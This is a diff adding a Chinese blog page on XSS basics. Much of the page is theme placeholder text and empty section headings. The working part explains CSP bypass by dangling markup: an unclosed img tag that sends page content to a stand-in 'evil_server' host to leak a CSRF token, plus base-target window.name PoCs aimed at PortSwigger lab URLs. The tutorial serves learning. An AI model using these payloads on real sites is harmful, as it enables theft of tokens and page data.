@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title> 0. XSS 基础  &middot; Fkbug </title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.51" />
+
+
+
+
+<link rel="stylesheet" href="/css/vec.min.css">
+
+<link rel="stylesheet" href="/css/prism.css">
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/favicon.ico">
+
+
+<link href="" rel="alternate" type="application/rss+xml" title="Fkbug" />
+
+
+
+
+<script src="/js/prism.js" async="" ></script>
+
+
+<script src="/js/btn.js" async=""></script>
+
+
+</head>
+
+<body>
+  <header>
+  <nav>
+    <ul>
+      
+      
+      
+      
+      <li class="pull-left">
+        <a href="/post/xss/"><i class="fas fa-list-ul" id="toc_btn"></i></a>
+      </li>
+      <li class="pull-left">
+        <a href="https://www.fkbug.com">fkbug</a>
+      </li>
+      
+      
+      <li class="pull-left">
+        <a href="/categories">post</a>
+      </li>
+      
+      <li class="pull-right">
+        <a href=""><i class="fas fa-lightbulb" id="bulb_btn"></i></a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+  <div class="content toc">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#xss-base">xss base:</a>
+<ul>
+<li><a href="#1-html-css-javascript">1. html css javascript</a></li>
+<li><a href="#2-学习一种漏洞最好的办法就是自己写有漏洞的代码-然后自己再利用这个漏洞-所以就有了下边这个-xss-游戏">2. 学习一种漏洞最好的办法就是自己写有漏洞的代码，然后自己再利用这个漏洞， 所以就有了下边这个 xss 游戏：</a></li>
+</ul></li>
+<li><a href="#xss-protection">xss protection:</a>
+<ul>
+<li><a href="#same-origin-同源策略-bypass">Same-origin (同源策略)  bypass</a></li>
+<li><a href="#csp-content-security-policy-内容安全策略">CSP ( Content Security Policy :内容安全策略 )</a></li>
+</ul></li>
+<li><a href="#xss-cheatsheet">xss cheatsheet</a></li>
+<li><a href="#xss-exploit">xss exploit</a>
+<ul>
+<li><a href="#phishing">Phishing</a></li>
+<li><a href="#xss-worm">xss worm</a></li>
+</ul></li>
+<li><a href="#xss-advanced-topic">xss advanced topic</a>
+<ul>
+<li><a href="#1-flash-xss">1. flash xss</a></li>
+<li><a href="#2-xss-in-css">2. xss in css</a></li>
+<li><a href="#3-uxss">3. uxss</a></li>
+</ul></li>
+<li><a href="#xss-fuzz">xss fuzz</a></li>
+<li><a href="#xss-scanner">xss scanner</a></li>
+</ul></li>
+</ul>
+</nav>
+    
+    <section class="post">
+      <h1 class="post-title"><a href="https://www.fkbug.com/post/xss/">0. XSS 基础 </a></h1>
+      <span class="post-date">Oct 13, 2018 </span>
+      <div class="post-content">
+        
+
+<h2 id="xss-base">xss base:</h2>
+
+<blockquote>
+<p>关于引用的话要怎样才好看呢？
+关于应用首都基辅罗斯结果 Life and围殴的Game
+Fubk llall sldjflsj lwejl</p>
+
+<p>态度，样式、颜色</p>
+</blockquote>
+
+<p>你好啊，我的主题</p>
+
+<p>正文字体预览Preface A Li你好1l Text 不知道要怎么个123难412看Fkbug法Life And Games Are full of bugs</p>
+
+<p>公式：</p>
+
+<p><code>$${\sqrt {n}}\left(\left({\frac {1}{n}}\sum _{i=1}^{n}X_{i}\right)-\mu \right)\ {\xrightarrow {d}}\ N\left(0,\sigma ^{2}\right)$$</code></p>
+
+<p>行内公式：
+you have to include math expressions in a pair of backticks (inline: <code>`$ $`</code>; display style: <code>`$$ $$`</code>), e.g., <code>$S_n = \sum_{i=1}^n X_i$</code></p>
+
+<p>TODO:
+- [x] Write an R package.
+- [ ] Write a book.
+- [ ] &hellip;
+- [ ] Profit!</p>
+
+<h3 id="1-html-css-javascript">1. html css javascript</h3>
+
+<script type="application/javascript" src="//gist.github.com/laozhu/8285349.js"></script>
+
+<h3 id="2-学习一种漏洞最好的办法就是自己写有漏洞的代码-然后自己再利用这个漏洞-所以就有了下边这个-xss-游戏">2. 学习一种漏洞最好的办法就是自己写有漏洞的代码，然后自己再利用这个漏洞， 所以就有了下边这个 xss 游戏：</h3>
+
+
+
+
+
+
+
+
+  <iframe
+    class="shengxiang"
+    width="800"
+    height="450"
+    scrolling="no"
+    frameborder="0"
+    allowfullscreen
+    src="https://ppt.baomitu.com/embed/a8a49a00?style=light">
+  </iframe>
+
+
+
+
+<h2 id="xss-protection">xss protection:</h2>
+
+<h3 id="same-origin-同源策略-bypass">Same-origin (同源策略)  bypass</h3>
+
+<p>reference: <a href="https://cloud.tencent.com/developer/article/1097309">https://cloud.tencent.com/developer/article/1097309</a>
+blabla</p>
+
+<h3 id="csp-content-security-policy-内容安全策略">CSP ( Content Security Policy :内容安全策略 )</h3>
+
+<ul>
+<li>1. 根据 CSP 中的允许域名构建自己的域名服务器来匹配其白名单</li>
+<li>2. 先跨域，再执行脚本</li>
+</ul>
+
+<p>CSP 安全级设置不够高的时候， 可以用利用页内代码的方法来绕过:</p>
+
+<p>假设一个注入点是这样的：
+<pre class="line-numbers">
+<code class="language-javascript">
+  INJECTION HERE<br />
+  token = &lsquo;supersecret&rsquo;;
+</code></pre></p>
+
+<p>然后假如我们注入一个不闭合的 img 标签：</p>
+
+<pre><code>&lt;img src=&quot;https://evil_server/?
+</code></pre>
+
+<p>那么整个网页会变成这个样子：
+这样的话，在注入点到下一个双引号之间的位置便会去访问我们的远程服务器。
+就有可能获取一些敏感信息，比如 CSRF token.</p>
+
+<pre><code class="language-javascript">&lt;img src=&quot;https://evil_server/?&lt;b&gt;test&lt;/b&gt;
+&lt;script&gt;
+  token = 'supersecret';
+&lt;/script&gt;
+&lt;form action='blah&quot;&gt;&lt;/form&gt;
+</code></pre>
+
+<pre>What is this color?</pre>
+
+<pre><code>&lt;a href=http://subdomin1.postswigger-labs.net/dangling_markup/name.html&gt;&lt;font size=100 color=red&gt;You must click me&lt;/font&gt;&lt;/a&gt;&lt;base target=&quot;blah
+</code></pre>
+
+<p>但当打开 CSP 的 <code>default-src 'none'; base-uri 'none'; 选项后
+我们上边的 poc 中的 img 标签便会被强制闭合， 因为 CSP 中会禁止加载跨域资源来防止反射型的 XSS
+这样我们的反射型 xss 便无法执行了
+那么怎么绕过呢？
+这就不得不说上边 CSP 的缓解措施的一个缺陷了，那便是当我们的标签中添加了一个未闭合的属性值时，
+即有一个</code>“<code>或</code>&lsquo;` 未闭合的情况下， CSP 并不会自动闭合我们注入的标签
+那这个缺陷怎么利用呢？</p>
+
+<p><code>&lt;base&gt;</code> 标签利用：
+利用 <code>&lt;base&gt;</code> 标签中的 <code>target</code> 属性，我们可以改变页面内每个链接的 Window 对象id。
+然后通过注入一个未完成的 target 属性， 页面内在注入点之后的所有 html 链接的 Window对象id 都会被修改成 target 属性的值， 直到 target 属性闭合。</p>
+
+<p>以上边的网页的上下文环境为例， 构造 poc 如下：</p>
+
+<pre><code>&lt;a href=http://subdomin1.postswigger-labs.net/dangling_markup/name.html&gt;&lt;font size=100 color=red&gt;You must click me&lt;/font&gt;&lt;/a&gt;&lt;base target=&quot;blah
+</code></pre>
+
+<p>为了盗取 Cookie 之类的， 因为 Windows对象id 是跨域暴露的，我们只需要根据这个 Windows 对象id 构造 第二个 poc，
+这样，当上边的 poc 用户点击第一个 poc 触发之后，跳转一下 url， 然后便会自动触发我们的第二个 poc:</p>
+
+<pre><code>&lt;script&gt;alert(&quot;The extracted content is:&quot; + name);&lt;/script&gt;
+</code></pre>
+
+<p>这样便绕过了 CSP， 重新将反射型 XSS 利用了起来</p>
+
+<p>但是如果网页注入点之后又有 <base target > 的话，会把我们自己的值给覆盖掉，为了解决这个问题
+我们可以自定义自己私有的 <code>&lt;base&gt;</code> 标签：</p>
+
+<p><code>&lt;base target=&quot;_self&quot; /&gt;</code></p>
+
+<p>但是 <Base> 标签一般没什么使用机会，那么更通用的情况下怎么办呢？</p>
+
+<p>The idea is to inject a form with a target and when the form is submitted it posts to itself again with a normal link. This first click sets the window name with the target and then you have to click the link to retrieve the data from the window name, so you have two clicks instead of one.</p>
+
+<pre>
+<code>
+http://portswigger-labs.net/dangling_markup/?x=%3Cinput%20name=x%20type=hidden+form=x%20value=%22%26lt%3Ba%20href%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%26gt%3B%26lt%3Bfont%20size%3D100%20color%3Dred%26gt%3BYou%20must%20click%20me%26lt%3B%2Ffont%26gt%3B%26lt%3B%2Fa%26gt%3B%22%3E%3Cbutton%20form=x%3E%3Cfont%20size=100%20color=red%3EClick%20me%3C/font%3E%3C/button%3E%3Cform+id=x%20target=%22blah
+</code>
+</pre>
+
+<pre>
+<code class="language-html">
+http://portswigger-labs.net/dangling_markup/?x=%3Ca+href%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%3E%3Cfont+size%3D100+color%3Dred%3EYou+must+click+me%3C%2Ffont%3E%3C%2Fa%3E
+</code>
+</pre>
+
+<p>有所不同便在于，因为是利用的表单，所以需要点击两次才能触发。</p>
+
+<h2 id="xss-cheatsheet">xss cheatsheet</h2>
+
+<p>玩完游戏进行总结:</p>
+
+<h2 id="xss-exploit">xss exploit</h2>
+
+<h3 id="phishing">Phishing</h3>
+
+<h3 id="xss-worm">xss worm</h3>
+
+<h2 id="xss-advanced-topic">xss advanced topic</h2>
+
+<h3 id="1-flash-xss">1. flash xss</h3>
+
+<h3 id="2-xss-in-css">2. xss in css</h3>
+
+<h3 id="3-uxss">3. uxss</h3>
+
+<h2 id="xss-fuzz">xss fuzz</h2>
+
+<p>知道 xss 的原理以后， 我们如何挖掘这一类型的漏洞呢？</p>
+
+<h2 id="xss-scanner">xss scanner</h2>
+
+<p>如何编写一个 xss 漏洞的扫描器 ？</p>
+
+      </div>
+    </section>
+    
+    <section class="pagination clearfix">
+      
+      <a class="btn previous " href="https://www.fkbug.com/post/burpsuite/"> Burpsuite  </a> 
+       
+      
+      <a class="btn next " href="https://www.fkbug.com/post/vulnerability/"> 0. Base Architecture </a> 
+      
+    </section>
+    
+     
+ <div class="comments">
+   <script src= "https://utteranc.es/client.js"
+         repo= "gkfnf/utterances"
+         issue-term= "pathname"
+         theme= "github-light"
+         crossorigin="anonymous"
+         async>
+   </script>
+ </div>
+
+
+
+
+
+
+  </div>
+  
+  <footer>
+    <script src="//yihui.name/js/math-code.js"></script>
+    <script async src="//mathjax.rstudio.com/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  <div class="footer-info">
+    <p>
+      <a href="mailto:978694661@qq.com?subject="><i class="far fa-envelope"></i> Fkbug</a>
+      |
+        <a href="https://gohugo.io/" title="Hugo :: A fast and modern static website engine">0.51  </a>|
+        <a href="https://github.com/IvanChou/yii.im" title="vec">Fk</a>  
+      |
+      <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/" title="CC BY-NC-ND 3.0">CC BY-NC-ND 3.0</a>
+    </p>
+  </div>
+</footer>
+  
+
+  
+
+</body>
+
+</html>
